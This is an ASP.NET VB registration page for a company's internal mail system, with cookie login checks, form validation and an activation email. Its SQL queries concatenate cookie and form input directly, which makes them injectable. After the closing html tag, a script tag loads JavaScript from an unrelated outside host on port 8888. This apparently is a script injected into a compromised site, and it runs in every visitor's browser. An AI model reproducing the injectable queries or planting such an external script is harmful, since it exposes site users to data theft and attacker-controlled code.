<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Dim VNum As String 
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Exit Sub
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") > 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Protected Sub Timer_timemsg_Tick(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim tempmsg As String
        Select Case Now.Hour
            Case 0 To 4
                tempmsg = "凌晨好！"
            Case 5 To 7
                tempmsg = "早上好！"
            Case 8 To 11
                tempmsg = "上午好！"
            Case 12
                tempmsg = "中午好！"
            Case 13 To 17
                tempmsg = "下午好！"
            Case 18 To 23
                tempmsg = "晚上好！"
        End Select
        Label_timemsg.Text = "现在是" & CStr(Now.Date.Year) & "年" & Right("0" & CStr(Now.Month), 2) & "月" & Right("0" & CStr(Now.Day), 2) & "日" & " " & Right("0" & CStr(Now.Hour), 2) & "时" & Right("0" & CStr(Now.Minute), 2) & "分" & Right("0" & CStr(Now.Second), 2) & "秒 " & tempmsg
    End Sub
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
        cmd.CommandText = "select * from webinfo where isreg=true"
        dr = cmd.ExecuteReader()
        If dr.HasRows = False Then
            dr.Close()
            FunctionClass.DisplayErr(weberr.regfalse)
        End If
        dr.Close()
        ImageButton_verifychar.ImageUrl = "VerifyChar.aspx"
        VNum = Session(FunctionClass.GetIP() & "VNum")
        DropDownList_section.Items.Add("选择部门")
        cmd.CommandText = "select * from sectioninfo"
        dr = cmd.ExecuteReader()
        If dr.HasRows = True Then
            While dr.Read()
                DropDownList_section.Items.Add(dr("sectionname"))
            End While
        End If
        dr.Close()
    End Sub
    Protected Sub ImageButton_verifychar_Click(ByVal sender As Object, ByVal e As System.Web.UI.ImageClickEventArgs)
        ImageButton_verifychar.ImageUrl = "VerifyChar.aspx"
        VNum = Session(FunctionClass.GetIP() & "VNum")
    End Sub
    Protected Sub Button_reset_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Text_username.Text = ""
        Text_password.Text = ""
        Text_password2.Text = ""
        Text_name.Text = ""
        Text_email.Text = ""
        DropDownList_section.SelectedIndex = 0
        Text_verifychar.Text = ""
        ImageButton_verifychar.ImageUrl = "verifychar.aspx"
        VNum = Session(FunctionClass.GetIP() & "VNum")
    End Sub
    Protected Sub Button_register_Click(ByVal sender As Object, ByVal e As System.EventArgs)
	on error resume next
        Dim rndtext As String
        Text_username.Text = Trim(Text_username.Text)
        Text_password.Text = Trim(Text_password.Text)
        Text_password2.Text = Trim(Text_password2.Text)
        Text_name.Text = Trim(Text_name.Text)
        Text_email.Text = Trim(Text_email.Text)
        Text_verifychar.Text = Trim(Text_verifychar.Text)
        If Trim(Text_verifychar.Text) = "" Then
            MsgBox("验证码为空！", 4096, "错误")
        ElseIf Text_verifychar.Text <> LCase(VNum) Then
            MsgBox("验证码错误！", 4096, "错误")
        ElseIf Text_username.Text = "" Then
            MsgBox("用户名为空！", 4096, "错误")
        ElseIf Text_password.Text = "" Then
            MsgBox("密码为空！", 4096, "错误")
        ElseIf Text_password2.Text = "" Then
            MsgBox("确认密码为空！", 4096, "错误")
        ElseIf Text_name.Text = "" Then
            MsgBox("姓名为空！", 4096, "错误")
        ElseIf Text_email.Text = "" Then
            MsgBox("E-mail地址为空！", 4096, "错误")
        ElseIf DropDownList_section.SelectedIndex <= 0 Then
            MsgBox("请选择部门！", 4096, "错误")
        Else
            cmd.CommandText = "select * from userinfo where username='" & Text_username.Text & "'"
            dr = cmd.ExecuteReader()
            If dr.HasRows = True Then
                MsgBox("用户名已存在！", 4096, "错误")
                dr.Close()
                Exit Sub
            End If
            dr.Close()
            If Len(Text_username.Text) < 6 Then
                MsgBox("用户名长度小于6位！", 4096, "错误")
            ElseIf Len(Text_password.Text) < 6 Then
                MsgBox("密码长度小于6位！", 4096, "错误")
            ElseIf Text_password.Text <> Text_password2.Text Then
                MsgBox("两次输入的密码不一致！", 4096, "错误")
            ElseIf FunctionClass.checkemail(Text_email.Text) = False Then
                MsgBox("E-mail不合法！", 4096, "错误")
            Else
                cmd.CommandText = "select * from userinfo where [e-mail]='" & Text_email.Text & "'"
                dr = cmd.ExecuteReader()
                If dr.HasRows = True Then
                    MsgBox("E-mail已被使用！", 4096, "错误")
                    dr.Close()
                    Exit Sub
                End If
                dr.Close()
                rndtext = FunctionClass.Getrndtext(100)
                cmd.CommandText = "insert into userinfo([username],[password],[name],[e-mail],[SectionID],[UserType],[rndtext],[active]) values('" & Text_username.Text & "','" & FunctionClass.MD5String(Text_password.Text) & "','" & Text_name.Text & "','" & Text_email.Text & "'," & CStr(DropDownList_section.SelectedIndex) & ",0,'" & rndtext & "',False)"
                If cmd.ExecuteNonQuery() <= 0 Then
                    FunctionClass.DisplayErr(weberr.accessdberr)
                Else
                    cmd.CommandText = "select * from webinfo"
                    dr = cmd.ExecuteReader
                    dr.Read()
                    FunctionClass.sendmail(Text_email.Text, "注册成功", "恭喜您成功注册" & dr("comname") & "内部邮件系统。<br>您的账号是：" & Text_username.Text & "<br>请将以下链接复制到地址栏中打开：" & FunctionClass.GetUrl() & "/activeuser.aspx?username=" & Text_username.Text & "&rndtext=" & rndtext)
                    Response.Redirect("registersucc.aspx?username=" & Text_username.Text)
                End If
            End If
        End If
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    <% 
        cmd.CommandText = "select * from WebInfo"
        dr = cmd.ExecuteReader()
        If dr.HasRows() = True Then
            dr.Read()
            Response.Write(dr("comname") & "内部邮件系统-注册")
        End If
        dr.Close()
     %>
    </title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:scriptmanager ID="Scriptmanager1" runat="server">
        </asp:scriptmanager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
        <ContentTemplate> 
        <asp:Timer ID="Timer_timemsg" runat="server" Interval ="1" OnTick="Timer_timemsg_Tick" /> 
        <asp:Label ID="Label_timemsg" runat="server" Text="Label" Width="744px" />
        </ContentTemplate>
        </asp:UpdatePanel>
        <% 
            cmd.CommandText = "select * from WebInfo"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = True Then
                dr.Read()
                Response.Write("<br /><br /><center><img src=logo.jpg><font color=#FFFFFF size=12px>" & dr("comname") & "内部邮件系统欢迎您！</font></center><br /><br />")
            End If
            dr.Close()
        %>
        <center>
        <font size="12px" color="#ffffff">注册</font>
        </center>
        </div>   
        <table>
        <tr valign ="top">
        <td style="width: 648px">
            <div style="float:right;">
            &nbsp;&nbsp;&nbsp;&nbsp;
                <asp:Label ID="Label1" runat="server" Text="用户名："></asp:Label>
                <asp:TextBox ID="Text_username" runat="server"></asp:TextBox>
                <br />
                <center>
                &nbsp;<br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<asp:Label ID="Label2" runat="server" Text="密码："></asp:Label>
                <asp:TextBox ID="Text_password" runat="server" TextMode="Password" Width="150px" ></asp:TextBox></center>
                <center>
                <br />
                <asp:Label ID="Label3" runat="server" Text="确认密码："></asp:Label>
                <asp:TextBox ID="Text_password2" runat="server" TextMode="Password" Width="150px"></asp:TextBox></center>
                <center>
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<asp:Label ID="Label4" runat="server" Text="姓名："></asp:Label>
                <asp:TextBox ID="Text_name" runat="server"></asp:TextBox>&nbsp;</center>
                <center>
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <asp:Label ID="Label5" runat="server" Text="E-mail："></asp:Label>
                <asp:TextBox ID="Text_email" runat="server"></asp:TextBox></center>
                <center>
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <asp:Label ID="Label6" runat="server" Text="部门："></asp:Label>
                <asp:DropDownList ID="DropDownList_section" runat="server" Width="152px">
                </asp:DropDownList>&nbsp;</center>
                <center>
                <br />
                &nbsp;&nbsp;&nbsp;
                <asp:Label ID="Label7" runat="server" Text="验证码："></asp:Label>
                <asp:TextBox ID="Text_verifychar" runat="server" Width="104px"></asp:TextBox>
                <asp:ImageButton ID="ImageButton_verifychar" runat="server" Height="20px" Width="41px" OnClick="ImageButton_verifychar_Click" /><br />
                </center>
                <center>
                <asp:Button ID="Button_register" runat="server" Text="注册" OnClick="Button_register_Click" />&nbsp;
                <asp:Button ID="Button_reset" runat="server" Text="重新填写" OnClick="Button_reset_Click" />
                </center>
                </div>
                </td>
        <td style="width: 495px">
        <font size="2px" color="#ffffff">最短为6个字符，最长为16个字符。<br />
            <br />
            <br />
            最短为6个字符，无最长字符限制。<br />
            <br />
            <br />
            再次输入一遍密码，要与“密码”相同。<br />
            <br />
            <br />
            请输入真实姓名。<br />
            <br />
            <br />
            本E-mail用于用户激活和取回用户名和密码之用。<br />
            <br />
            <br />
            此为公司部门。<br />
            <br />
            验证码防恶意注册。</font></td>
        </tr>
        </table>
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>